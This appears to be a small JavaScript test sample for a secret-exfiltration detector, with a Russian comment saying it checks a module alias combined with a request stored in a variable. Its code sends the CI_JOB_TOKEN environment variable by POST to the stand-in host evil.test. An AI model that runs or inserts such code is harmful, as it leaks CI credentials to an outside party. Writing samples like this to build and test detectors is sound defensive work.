// Алиас модуля плюс запрос в переменной: тело пишется в объект, созданный через алиас.
const h = require('node:https');
const r = h.request({ host: 'evil.test', path: '/collect', method: 'POST' });
r.end(process.env.CI_JOB_TOKEN);
